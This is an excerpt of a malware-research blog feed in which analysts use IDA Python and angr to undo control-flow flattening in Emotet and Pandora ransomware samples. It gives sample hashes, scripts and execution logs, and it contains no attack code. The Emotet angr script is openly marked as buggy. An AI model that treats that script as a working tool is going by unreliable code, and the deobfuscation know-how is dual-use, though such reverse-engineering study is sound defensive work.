            "content": "Overview . Sample: c7574aac7583a5bdc446f813b8e347a768a9f4af858404371eae82ad2d136a01 . Unpacked: eeb13cd51faa7c23d9a40241d03beb239626fbf3efe1dbbfa3994fc10dea0827 . References: . Malshare Sample (Unpacked) | . Research: . DFS and BFS graph traversal tutorial | OST2 - Reverse Engineering 3201: Symbolic Analysis | . Approach For Identifying Original Basic Blocks (OBB) - Assembly/IDA Only . Shout out to @mrexodia full credit goes to him for this approach! . . We are doing a breadth-first search through bb. This is specific to the binary we are analyzing, we just noticed that the jz/jnz is used for dispatcher control flow (it will differ for other binaries). For our search algorithm we will relie on this to mark a transition from the cf to an obb. . The generic algorithm. . Assume two states (not the same as the cff states) in obb and in cf. | Walk the graph in a bredth first search (BFS) and track your current state. When you are in cf you can transition to in obb on the positive branch of a jz or the negative branch of a jnz. | If you are in obb you don&#39;t exit until you hit an already identified in obb bb. | . | Mark each bb as you go | . This works because we are doing a BFS and the CFF forces a loop back to the dispatcher so we are garunteed to have already seen the dispatcher in cf bb before we reach the end of the first in obb. . The specific algorithm. . start at the disptacher entry this is the first dispatcher block | for each next bb if it doesn&#39;t end in a jz/jnz then we mark as dispatcher and search forward | if we are in a dispatcher and end with a jz the TRUE points to a obb and the FALSE points to another dispatcher | if we are in a dispatcher and end with a jnz the FALSE points to a obb and the TRUE points to another dispatcher | mark the blocks and continue our search BFS | if we are in an obb mark every next bb as an obb until we see a dispatcher block (then end that trace) | . import idaapi import idautils import idc from queue import Queue import struct # Basic blocks for dispatcher and obb # bb_states[start_address] = obb = True/False (obb or dispatcher) bb_states = {} bb_visited = set() fn_start = 0x10008784 fn_end = 0x100099D2 dispatcher_start = 0x1000953A function = idaapi.get_func(fn_start) flowchart = idaapi.FlowChart(function) # Get bb flowchart starting with dispatcher dispatcher_flowchart = list(flowchart[0].succs())[0] # Use a queue for BFS q = Queue() # Push dispatcher start onto queue and add info q.put(dispatcher_flowchart) bb_states[dispatcher_flowchart.start_ea] = {&#39;obb&#39;:False } # Walk through bb while not q.empty(): bb_flowchart = q.get() bb_start = bb_flowchart.start_ea # Get bb_info bb_info = bb_states[bb_start] #print(f&quot;-&gt; {hex(bb_start)} {bb_info}&quot;) if bb_start in bb_visited: # We don&#39;t need to re-process this just continue continue else: bb_visited.add(bb_start) # Check if there are successors if len(list(bb_flowchart.succs())) == 0: continue # Check if the bb is conditional if len(list(bb_flowchart.succs())) &gt; 1: # Parse the condition bb_end = prev_head(bb_flowchart.end_ea) if not bb_info.get(&#39;obb&#39;) and print_insn_mnem(bb_end) == &#39;jz&#39;: # The true jmp indicated an obb # The false indicates more dispatcher # We are going to check which next bb matches the # true contidion for the jz true_bb_address = get_operand_value(bb_end,0) for next_bb_flowchart in bb_flowchart.succs(): # Get the next bb address next_bb_start = next_bb_flowchart.start_ea # If we have already visited it ignore if next_bb_start in bb_visited: continue if next_bb_start == true_bb_address: # Put next bb onto the queue q.put(next_bb_flowchart) # Mark the bb as an obb bb_states[next_bb_start] = {&#39;obb&#39;:True} else: # This is another dispatcher bb # Put next bb onto the queue q.put(next_bb_flowchart) # Mark the bb as an obb bb_states[next_bb_start] = {&#39;obb&#39;:False} elif not bb_info.get(&#39;obb&#39;) and print_insn_mnem(bb_end) == &#39;jnz&#39;: # The true jmp indicated an obb # The false indicates more dispatcher # We are going to check which next bb matches the # true contidion for the jz true_bb_address = get_operand_value(bb_end,0) for next_bb_flowchart in bb_flowchart.succs(): # Get the next bb address next_bb_start = next_bb_flowchart.start_ea # If we have already visited it ignore if next_bb_start in bb_visited: continue if next_bb_start == true_bb_address: # Put next bb onto the queue q.put(next_bb_flowchart) # Mark the bb as an obb bb_states[next_bb_start] = {&#39;obb&#39;:False} else: # This is another dispatcher bb # Put next bb onto the queue q.put(next_bb_flowchart) # Mark the bb as an obb bb_states[next_bb_start] = {&#39;obb&#39;:True} else: # We can treat all next bb as if there is no condition # and propogate the bb type for next_bb_flowchart in bb_flowchart.succs(): # Get the next bb address next_bb_start = next_bb_flowchart.start_ea # If we have already visited it ignore if next_bb_start in bb_visited: continue # Add it to the queue and add info same as current block q.put(next_bb_flowchart) # Set bb type based on this bb bb_states[next_bb_flowchart.start_ea] = {&#39;obb&#39;:bb_info.get(&#39;obb&#39;)} else: # No condition next_bb_flowchart = list(bb_flowchart.succs())[0] # If not visited if next_bb_flowchart.start_ea not in bb_visited: # Push next block on queue and add info q.put(next_bb_flowchart) # Set bb type based on this bb bb_states[next_bb_flowchart.start_ea] = {&#39;obb&#39;:bb_info.get(&#39;obb&#39;)} #### ALL this for debugging # Add color to bb just for debugging def set_bb_color(ea, flowchart, color_value): for block in flowchart: if block.start_ea &lt;= ea and block.end_ea &gt; ea: # Loop and add color ptr = block.start_ea while ptr &lt;= prev_head(block.end_ea): set_color(ptr, CIC_ITEM, color_value) ptr = next_head(ptr) break # Verification conditions: # - all bb should be in the visited set # - each bb should have a type associated with it in the bb_states for bb_addr in bb_states: print(f&quot;{hex(bb_addr)}: {bb_states[bb_addr]}&quot;) if bb_states[bb_addr].get(&#39;obb&#39;): # Make green for obb set_bb_color(bb_addr, flowchart, 0x00ff00) else: # Make orange for dispatcher set_bb_color(bb_addr, flowchart, 0x00A5ff) . Deobfuscation With Symboic Execution . Once we have identified the cf and obb blocks we can start using the familliar symbolic execution approach we used for Pandora Ransomware CFF. . TODO.... . Approach For Identifying Original Basic Blocks (OBB) Using Symbolic Execution . The drawback of the assembly approach is that the analyst must first identify what condition causes a transition between the obb and cf blocks. This is a manual process. If we want to fully automate this in a generic way we need to use symbolic execution to identify which bb are cf and which are obb. . For this approach the analyst must still identify how the state is tracked (register) but heuristics can also be used to do this automatically. Once we identify the state we can use the same algorithm above but instead of using a jz/jnz assembly compare to test for a transition between a cf and obb block we can check our symbolic exeuction predicate to see if the state is an equation or a constant (ie. does the state change in the bb or is it constant) if it is constant than we know the state was not modified so this is a cf block if the state can change then this is obb. We must also track if the state has changed and how it was changed to determine if the bb has transitioned from a cf to an obb. . Glossary . cf - control flow | bb - basic block | obb - original basic block (these are from before the obfuscation) | cf bb - control flow basic block also known as part of the dispatcher or &quot;obfuscation code&quot; | symbolic execution - a process of transforming bb assembly code into mathematical/logical equations that can be solved | concolic execution - a mix of symbolic and real (emulation) excution ie. we sub in some concrete values to constrain the exectuion path where they exist in the code | BFS - breadth first search | . The Algorithm . assumption we don&#39;t want to use concolic execution, we just want symbolic execution because we want to trace every branch and we don&#39;t want a concrete STATE value we want a symbol (I think???) . on the entry to each bb reset to the STATE to be a symbol (I think this will force symboic execution) | for each bb step we check the following is the predicate an equation or a constant (ie. does it depend on the STATE). If it depends on the STATE then it must be a CF bb. | if it&#39;s a constant or the predicate an equation does NOT depend on the STATE then it must be the same type of bb as the previous one | check the STATE symbol, if it has been assigned a constant or an equation then this is a obb (if it&#39;s not undefined) | maintain a rolling label (cf/obb) for the bb as you step, propogate the label to each sequential bb until one of the above conditions is met | for each branch (new angr state) push this onto a queue and use a bfs approach | stop execution when we reach a labeled bb | . | . # # # BUGS!! # # This is a work in progress, we have atleast two bugs that cascate to create a bad graph # 1) we need to fix the logic so we correctly identify the first cf bb # 2) we need to figure out why angr chooses such weird bb breaks, like why break at random spots??? # ############################################################################################## import angr, claripy from queue import Queue import struct import logging logging.getLogger(&#39;angr&#39;).setLevel(&#39;ERROR&#39;) BINARY_PATH = &#39;/tmp/emotet.bin&#39; # Save some info about each bb # bb_states[bb_address] = {&quot;is_obb&quot;:true/false} bb_states = {} bb_visited = set() fn_start = 0x10008784 fn_end = 0x100099D2 dispatcher_start = 0x1000953A project = angr.Project(BINARY_PATH, load_options={&#39;auto_load_libs&#39;: False}) # TODO: We should explicately add the state since we know it (main) initial_state = project.factory.call_state(addr=fn_start) # Use this setting to skip calls instead of a hook initial_state.options.add(angr.options.CALLLESS) # Setup simulation manager simgr = project.factory.simgr(initial_state) # We are going to start with an assumption that the first BB is in an obb # Since we are using a queue we need to track this rolling state along with the address of the bb # bb_info = {address:&lt;&gt;, prev_is_obb:true/false} # Use a queue for BFS q = Queue() # Push function start onto queue bb_info = {&#39;address&#39;:fn_start, &#39;prev_is_obb&#39;:True} q.put(bb_info) ## TODO: currently we don&#39;t handle when the first bb in a transition from a cf to obb doesn&#39;t set the STATE, # our algorithm will think this is just another cf bb # Walk the queue while not q.empty(): bb_info = q.get() bb_address = bb_info.get(&#39;address&#39;) prev_bb_is_obb = bb_info.get(&#39;prev_is_obb&#39;) print(f&quot;BB: {hex(bb_address)}&quot;) #print(project.factory.block(simgr.active[0].addr).pp()) # Set the sim manager for the next state to remove any concrete value new_state = project.factory.blank_state(addr=bb_address) new_state.options.add(angr.options.CALLLESS) # Use successors to determine info about this block if len(list(project.factory.successors(new_state))) == 0: # If there are no successors this is an end bb so it must be an obb bb_states[bb_address] = {&#39;is_obb&#39;:True} elif len(list(project.factory.successors(new_state))) == 1: # If there is only next bb then there is no condition if prev_bb_is_obb: # If we are in an obb keep the obb label bb_states[bb_address] = {&#39;is_obb&#39;:True} else: # If we are in an cf we need to test to see if we changed the STATE # this will move us into an obb next_bb = project.factory.successors(new_state)[0] if next_bb.regs.ebx.uninitialized: bb_states[bb_address] = {&#39;is_obb&#39;:False} prev_bb_is_obb = False else: bb_states[bb_address] = {&#39;is_obb&#39;:True} else: # If there are multiple next bb then there is a condition # Determin if the branch depends on state flag_depends_on_state = False for next_bb in project.factory.successors(new_state): for constraint in next_bb.solver.constraints: for v in constraint.variables: if &#39;reg_ebx&#39; in v: flag_depends_on_state = True # If the branch depends on state then this is a cf block if flag_depends_on_state: bb_states[bb_address] = {&#39;is_obb&#39;:False} prev_bb_is_obb = False else: bb_states[bb_address] = {&#39;is_obb&#39;:True} # Mark this bb as visited bb_visited.add(bb_address) # Use successors to push next bb on queue for next_bb in project.factory.successors(new_state): next_address = next_bb.addr if next_address not in bb_visited: bb_info = {&#39;address&#39;:next_address, &#39;prev_is_obb&#39;:prev_bb_is_obb} q.put(bb_info) print(&quot;========================&quot;) print(&quot;DONE!&quot;) . BB: 0x10008784 ======================== BB: 0x10008914 ======================== BB: 0x10008aa1 ======================== BB: 0x10008c31 ======================== BB: 0x10008dbb ======================== BB: 0x10008f47 ======================== BB: 0x100090d0 ======================== BB: 0x1000925d ======================== BB: 0x100093e6 ======================== BB: 0x10009555 ======================== BB: 0x10009894 ======================== BB: 0x10009863 ======================== BB: 0x1000955b ======================== BB: 0x100099c1 ======================== BB: 0x100098a0 ======================== BB: 0x1000988a ======================== BB: 0x100097cd ======================== BB: 0x10009563 ======================== BB: 0x10009549 ======================== BB: 0x100098e8 ======================== BB: 0x100098a4 ======================== BB: 0x1000953a ======================== BB: 0x100097e6 ======================== BB: 0x10009713 ======================== BB: 0x1000956f ======================== BB: 0x10009904 ======================== BB: 0x100098ac ======================== BB: 0x100099c6 ======================== BB: 0x10009830 ======================== BB: 0x10009732 ======================== BB: 0x100095a9 ======================== BB: 0x10009573 ======================== BB: 0x1000998c ======================== BB: 0x100098d8 ======================== BB: 0x100099d2 ======================== BB: 0x1000985b ======================== BB: 0x10009750 ======================== BB: 0x100095c2 ======================== BB: 0x1000957b ======================== BB: 0x10009998 ======================== BB: 0x1000999f ======================== BB: 0x100098db ======================== BB: 0x100096fa ======================== BB: 0x1000977e ======================== BB: 0x100095e3 ======================== BB: 0x10009595 ======================== BB: 0x100099a4 ======================== BB: 0x100099ba ======================== BB: 0x100097af ======================== BB: 0x10009615 ======================== BB: 0x100099ba ======================== BB: 0x100097c5 ======================== BB: 0x100096a2 ======================== BB: 0x100096f5 ======================== BB: 0x100096d6 ======================== BB: 0x100096f2 ======================== DONE! . bb_states . {268470148: {&#39;is_obb&#39;: True}, 268470548: {&#39;is_obb&#39;: True}, 268470945: {&#39;is_obb&#39;: True}, 268471345: {&#39;is_obb&#39;: True}, 268471739: {&#39;is_obb&#39;: True}, 268472135: {&#39;is_obb&#39;: True}, 268472528: {&#39;is_obb&#39;: True}, 268472925: {&#39;is_obb&#39;: True}, 268473318: {&#39;is_obb&#39;: False}, 268473685: {&#39;is_obb&#39;: True}, 268474516: {&#39;is_obb&#39;: False}, 268474467: {&#39;is_obb&#39;: False}, 268473691: {&#39;is_obb&#39;: False}, 268474817: {&#39;is_obb&#39;: True}, 268474528: {&#39;is_obb&#39;: False}, 268474506: {&#39;is_obb&#39;: False}, 268474317: {&#39;is_obb&#39;: False}, 268473699: {&#39;is_obb&#39;: False}, 268473673: {&#39;is_obb&#39;: False}, 268474600: {&#39;is_obb&#39;: False}, 268474532: {&#39;is_obb&#39;: False}, 268473658: {&#39;is_obb&#39;: False}, 268474342: {&#39;is_obb&#39;: False}, 268474131: {&#39;is_obb&#39;: False}, 268473711: {&#39;is_obb&#39;: False}, 268474628: {&#39;is_obb&#39;: False}, 268474540: {&#39;is_obb&#39;: False}, 268474822: {&#39;is_obb&#39;: False}, 268474416: {&#39;is_obb&#39;: True}, 268474162: {&#39;is_obb&#39;: False}, 268473769: {&#39;is_obb&#39;: False}, 268473715: {&#39;is_obb&#39;: False}, 268474764: {&#39;is_obb&#39;: True}, 268474584: {&#39;is_obb&#39;: True}, 268474834: {&#39;is_obb&#39;: False}, 268474459: {&#39;is_obb&#39;: False}, 268474192: {&#39;is_obb&#39;: False}, 268473794: {&#39;is_obb&#39;: False}, 268473723: {&#39;is_obb&#39;: False}, 268474776: {&#39;is_obb&#39;: False}, 268474783: {&#39;is_obb&#39;: True}, 268474587: {&#39;is_obb&#39;: True}, 268474106: {&#39;is_obb&#39;: False}, 268474238: {&#39;is_obb&#39;: True}, 268473827: {&#39;is_obb&#39;: False}, 268473749: {&#39;is_obb&#39;: True}, 268474788: {&#39;is_obb&#39;: False}, 268474810: {&#39;is_obb&#39;: False}, 268474287: {&#39;is_obb&#39;: False}, 268473877: {&#39;is_obb&#39;: False}, 268474309: {&#39;is_obb&#39;: False}, 268474018: {&#39;is_obb&#39;: True}, 268474101: {&#39;is_obb&#39;: False}, 268474070: {&#39;is_obb&#39;: False}, 268474098: {&#39;is_obb&#39;: False}} .",
            "url": "https://research.openanalysis.net/emotet/malware/angr/symbolic%20execution/deobfuscation/research/2022/04/06/emotet_deobfuscation.html",
            "relUrl": "/emotet/malware/angr/symbolic%20execution/deobfuscation/research/2022/04/06/emotet_deobfuscation.html",
            "date": " ‚Ä¢ Apr 6, 2022"
        }
        
    
  
    
        ,"post56": {
            "title": "Angr Control Flow Deobfuscation",
            "content": "Overview . Today we are going to learn a bit about how to use angr for control flow deobfuscation. We are using the Pandora Ransomware sample as an example. . Sample (packed) . 5b56c5d86347e164c6e571c86dbf5b1535eae6b979fede6ed66b01e79ea33b7b . Unpacked sample (we will be using this as our example) . 2619862c382d3e375f13f3859c6ab44db1a4bce905b4a617df2390fbf36902e7 . The Concept . We have a binary that has been obfuscated using control flow flattening (CFF). The original control flow (CF) of each function has been replaced by a state machine. Each of the original code basic blocks (BB) has been given a state. To transition between the basic blocks a dispatcher is used which routes the control flow based on the current state. . Before CFF . After CFF . Removing CFF . The theory behind removing CFF is to identify the state of each original BB, and the &quot;next&quot; state(s) that each original BB along with the condition that sets each of these states. . Basic Block State The BB state can be thought of as -- what state must be put INTO the dispatcher to route to the BB. . Next State The &quot;next&quot; state depends on whether the BB has conditional control flow. If there is no condition then there will only be ONE next state. However, if there is conditional control flow there will be TWO next states with a dependency on some condition within the BB. . In practice determining theses states and next states can be difficult as the dispatcher may be complex and the conditions used to set the next state may also be complex. . Initial Analysis . Before we can begin analyzing the CFF state machine we need to extract the following initial information from the function. . The function entrypoint (this is assumed) | The address of the DISPATCHER start It may be possible to determine this heuristically as many bb will jmp to this address | . | The STATE variable The STATE variable is the variable used to pass the STATE to the DISPATCHER. In simple CFF cases the same variable is used throughout the original code blocks but in more complex CFF this cannot be relied on. | . | The address of each of the original code basic blocks This may not be needed initially depending on the strategy. It maybe be possible to recover these during symbolic execution. | . | . An Emulation Approach (For Comparison) . To associate a state with each original code block we can first collect a list of states using some simple assembly pattern matching in the original code blocks (the state will be moved to EAX). Then start emulation at the dispatcher start and run an emulation for each state stopping on the first jmp to an original code block -- this is the state for that block. Then once we have the states associate with each block we can manually connect up the original basic blocks and remove the dispatcher. . This approach has many drawbacks, but the main issues are finding the states using pattern matching. Depending on how the states are set it may not be as simple as collecting all of the states by looking for a mov eax, immediate. Also, once the states are assigned to the basic blocks determining what conditions trigger which next state for each bb may also prove complex and very brittle (less re-usable code) . A Symbolic Execution Approach . With symbolic execution we are not limited to the constraints of the variables, but can &quot;symbolically execute&quot; over all possible paths between the dispatcher and the original basic blocks. This allows us to test all possible options for the STATE variable. T . Associating A STATE With Each Original Basic Block . The first step is to associate a STATE with a an original basic block (OBB). We have an advantage with the state machine in that we know the initial state (it muste either be set in the entrpoint or passed into the funcation as an argument). Once we know the initial state we can use this to execute until we reach an OBB. We can now associated this state with the OBB . Determining Next STATE(S) . Once we have reached the start of an OBB we can symbolically execute until we reach the dispatcher again. Once we reach the dispatcher we can query the symbolic equation for possible value(s) of the STATE. There may be multiple values depending on the conditional logic in the OBB. These STATE values are the next states and will allow us to further interrogate the function to associated with with more OBBs. . CFF State Machine Parsing Algorithm . The full algorithm for parsing the CFF state machine is described below. . Use initial STATE and execute from the start of the DISPATCHER until reaching an OBB | Assocated this STATE with the OBB | Continue executing until reaching the DISPATCHER | Solve the symbolic equation for the STATE(S) to determine the NEXT-STATE(s) of the OBB | Associate these NEXT-STATE(s) with the OBB (STATE -&gt; OBB -&gt; NEXT-STATE) | Repeate the process for each NEXT-STATE treatin each one as the new STATE | . References . angr docs | angr cheat sheet | z3 | OST2 - Reverse Engineering 3201: Symbolic Analysis | Unpacked Pandora sample 2619862c382d3e375f13f3859c6ab44db1a4bce905b4a617df2390fbf36902e7 | Control Flow Flattening | Deobfuscation - Recovering an ollvm | stadeo deobfuscation tool | Control Flow Unflattening | Analysis of Virtualization-based Obfuscation (r2con2021workshop) | . Complete Solution from @mrexodia . In this approach less initial information is needed about the binary. Also this approach will work on the un-patched binary (something I didn&#39;t realize was possible with angre). One of the advantage of Angr is that it is able to read and interact with the hard-coded jmp table without additional hooks/patches. . All creadit for this method goes to mrexodia who developed the original code and proof of concept for this approach. . import angr proj = angr.Project(&quot;/tmp/pandora_dump_SCY.bin&quot;, load_options={&#39;auto_load_libs&#39;: False}) def get_dispatcher_state(function, dispatcher): state = proj.factory.call_state(addr=function) # Ignore function calls # https://github.com/angr/angr/issues/723 state.options.add(angr.options.CALLLESS) simgr = proj.factory.simulation_manager(state) # Find the dispatcher while True: simgr.step() assert len(simgr.active) == 1 state = simgr.active[0] if state.addr == dispatcher: return state.copy() addr_main = 0x7FF6C4B066F0 addr_dispatcher = 0x7ff6c4b067f0 dispatcher_state = get_dispatcher_state(function=addr_main, dispatcher=addr_dispatcher) print(f&quot;Dispatcher state: {dispatcher_state}&quot;) initial_state = dispatcher_state.solver.eval_one(dispatcher_state.regs.eax) print(f&quot;Initial eax: {hex(initial_state)}&quot;) . WARNING | 2022-03-31 15:04:33,126 | angr.calling_conventions | Guessing call prototype. Please specify prototype. WARNING | 2022-03-31 15:04:33,138 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing register with an unspecified value. This could indicate unwanted behavior. WARNING | 2022-03-31 15:04:33,139 | angr.storage.memory_mixins.default_filler_mixin | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by: WARNING | 2022-03-31 15:04:33,139 | angr.storage.memory_mixins.default_filler_mixin | 1) setting a value to the initial state WARNING | 2022-03-31 15:04:33,140 | angr.storage.memory_mixins.default_filler_mixin | 2) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold null WARNING | 2022-03-31 15:04:33,141 | angr.storage.memory_mixins.default_filler_mixin | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages. WARNING | 2022-03-31 15:04:33,141 | angr.storage.memory_mixins.default_filler_mixin | Filling register r15 with 8 unconstrained bytes referenced from 0x7ff6c4b066f0 (offset 0x66f0 in pandora_dump_SCY.bin (0x7ff6c4b066f0)) WARNING | 2022-03-31 15:04:33,143 | angr.storage.memory_mixins.default_filler_mixin | Filling register r14 with 8 unconstrained bytes referenced from 0x7ff6c4b066f2 (offset 0x66f2 in pandora_dump_SCY.bin (0x7ff6c4b066f2)) WARNING | 2022-03-31 15:04:33,144 | angr.storage.memory_mixins.default_filler_mixin | Filling register r13 with 8 unconstrained bytes referenced from 0x7ff6c4b066f4 (offset 0x66f4 in pandora_dump_SCY.bin (0x7ff6c4b066f4)) WARNING | 2022-03-31 15:04:33,146 | angr.storage.memory_mixins.default_filler_mixin | Filling register r12 with 8 unconstrained bytes referenced from 0x7ff6c4b066f6 (offset 0x66f6 in pandora_dump_SCY.bin (0x7ff6c4b066f6)) WARNING | 2022-03-31 15:04:33,147 | angr.storage.memory_mixins.default_filler_mixin | Filling register rsi with 8 unconstrained bytes referenced from 0x7ff6c4b066f8 (offset 0x66f8 in pandora_dump_SCY.bin (0x7ff6c4b066f8)) WARNING | 2022-03-31 15:04:33,149 | angr.storage.memory_mixins.default_filler_mixin | Filling register rdi with 8 unconstrained bytes referenced from 0x7ff6c4b066f9 (offset 0x66f9 in pandora_dump_SCY.bin (0x7ff6c4b066f9)) WARNING | 2022-03-31 15:04:33,150 | angr.storage.memory_mixins.default_filler_mixin | Filling register rbp with 8 unconstrained bytes referenced from 0x7ff6c4b066fa (offset 0x66fa in pandora_dump_SCY.bin (0x7ff6c4b066fa)) WARNING | 2022-03-31 15:04:33,152 | angr.storage.memory_mixins.default_filler_mixin | Filling register rbx with 8 unconstrained bytes referenced from 0x7ff6c4b066fb (offset 0x66fb in pandora_dump_SCY.bin (0x7ff6c4b066fb)) . Dispatcher state: &lt;SimState @ 0x7ff6c4b067f0&gt; Initial eax: 0x8cbc0434 . # %% def find_successors(state_value, dispatcher): state = dispatcher_state.copy() state.regs.eax = state.solver.BVV(state_value, 32) simgr = proj.factory.simulation_manager(state) while True: print(f&quot;eax: {simgr.active[0].regs.eax}&quot;) print(f&quot;Stepping: {simgr.active} ...&quot;) simgr.step() # TODO: the block before the dispatcher is wrong, we need the first non-dispatcher block if len(simgr.active) == 0: return state, [] assert len(simgr.active) == 1 state2 = simgr.active[0] print(f&quot; Only found a single sucessor: {hex(state2.addr)}&quot;) if state2.addr == dispatcher: print(f&quot; Dispatcher, eax: {state2.regs.eax}&quot;) # TODO: figure out where these potential values are set solutions = state2.solver.eval_upto(state2.regs.eax, 2) # TODO: might need more potential states return state, solutions elif state2.addr == 0x7ff6c4b070ea: # HACK: int3 here, no idea how to properly handle it return state, [] state = state2 . from queue import Queue # state_value =&gt; real basic block state states = {} q = Queue() q.put(initial_state) while not q.empty(): state_value = q.get() # Skip visited states if state_value in states: continue bb_state, successors = find_successors(state_value, addr_dispatcher) print(f&quot;{hex(state_value)} {bb_state} =&gt; {[hex(n) for n in successors]}&quot;) print() states[state_value] = bb_state, successors for state_value in successors: q.put(state_value) dot = &quot;digraph CFG { n&quot; for state_value in states.keys(): _, succ = states[state_value] for s in succ: dot += f&quot; &quot;{hex(state_value)} &quot; -&gt; &quot;{hex(s)} &quot; n&quot; dot += &quot;}&quot; print(dot) . WARNING | 2022-03-31 15:04:33,342 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeffa8 with 4 unconstrained bytes referenced from 0x7ff6c4b06da8 (offset 0x6da8 in pandora_dump_SCY.bin (0x7ff6c4b06da8)) . eax: &lt;BV32 0x8cbc0434&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b06819 eax: &lt;BV32 0x8cbc0434&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06819&gt;] ... Only found a single sucessor: 0x7ff6c4b06830 eax: &lt;BV32 0x8cbc0434&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06830&gt;] ... Only found a single sucessor: 0x7ff6c4b06847 eax: &lt;BV32 0x8cbc0434&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06847&gt;] ... Only found a single sucessor: 0x7ff6c4b06863 eax: &lt;BV32 0x8cbc0434&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06863&gt;] ... Only found a single sucessor: 0x7ff6c4b0687f eax: &lt;BV32 0x8cbc0434&gt; Stepping: [&lt;SimState @ 0x7ff6c4b0687f&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 if fake_ret_value_10_64{UNINITIALIZED} == 0x0 then 0x173ba5e1 else 0x7d9d86f3&gt; 0x8cbc0434 &lt;SimState @ 0x7ff6c4b0687f&gt; =&gt; [&#39;0x7d9d86f3&#39;, &#39;0x173ba5e1&#39;] eax: &lt;BV32 0x7d9d86f3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b068b0 eax: &lt;BV32 0x7d9d86f3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068b0&gt;] ... Only found a single sucessor: 0x7ff6c4b06a30 eax: &lt;BV32 0x7d9d86f3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a30&gt;] ... Only found a single sucessor: 0x7ff6c4b06bbb eax: &lt;BV32 0x7d9d86f3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06bbb&gt;] ... Only found a single sucessor: 0x7ff6c4b067c8 eax: &lt;BV32 0x7d9d86f3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067c8&gt;] ... Only found a single sucessor: 0x7ff6c4b070d1 eax: &lt;BV32 0x7d9d86f3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b070d1&gt;] ... Only found a single sucessor: 0x7ff6c4b070ea 0x7d9d86f3 &lt;SimState @ 0x7ff6c4b070d1&gt; =&gt; [] eax: &lt;BV32 0x173ba5e1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b068b0 eax: &lt;BV32 0x173ba5e1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068b0&gt;] ... Only found a single sucessor: 0x7ff6c4b068c7 eax: &lt;BV32 0x173ba5e1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068c7&gt;] ... Only found a single sucessor: 0x7ff6c4b068e3 eax: &lt;BV32 0x173ba5e1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068e3&gt;] ... Only found a single sucessor: 0x7ff6c4b06ce1 eax: &lt;BV32 0x173ba5e1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06ce1&gt;] ... Only found a single sucessor: 0x7ff6c4b06cfd eax: &lt;BV32 0x173ba5e1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06cfd&gt;] ... Only found a single sucessor: 0x7ff6c4b06d2e eax: &lt;BV32 fake_ret_value_12_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06d2e&gt;] ... Only found a single sucessor: 0x7ff6c4b06d54 eax: &lt;BV32 fake_ret_value_13_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06d54&gt;] ... Only found a single sucessor: 0x7ff6c4b06d67 eax: &lt;BV32 fake_ret_value_14_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06d67&gt;] ... Only found a single sucessor: 0x7ff6c4b06d7a eax: &lt;BV32 fake_ret_value_15_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06d7a&gt;] ... Only found a single sucessor: 0x7ff6c4b06d95 eax: &lt;BV32 fake_ret_value_16_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06d95&gt;] ... Only found a single sucessor: 0x7ff6c4b06da8 eax: &lt;BV32 fake_ret_value_17_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06da8&gt;] ... Only found a single sucessor: 0x7ff6c4b06dd5 eax: &lt;BV32 fake_ret_value_19_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06dd5&gt;] ... Only found a single sucessor: 0x7ff6c4b06df2 eax: &lt;BV32 fake_ret_value_20_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06df2&gt;] ... Only found a single sucessor: 0x7ff6c4b06e05 eax: &lt;BV32 fake_ret_value_21_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06e05&gt;] ... Only found a single sucessor: 0x7ff6c4b06e20 eax: &lt;BV32 fake_ret_value_22_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06e20&gt;] ... Only found a single sucessor: 0x7ff6c4b06e33 eax: &lt;BV32 fake_ret_value_23_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06e33&gt;] ... Only found a single sucessor: 0x7ff6c4b06e57 eax: &lt;BV32 fake_ret_value_24_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06e57&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 0x7a980236&gt; 0x173ba5e1 &lt;SimState @ 0x7ff6c4b06e57&gt; =&gt; [&#39;0x7a980236&#39;] eax: &lt;BV32 0x7a980236&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b068b0 eax: &lt;BV32 0x7a980236&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068b0&gt;] ... Only found a single sucessor: 0x7ff6c4b06a30 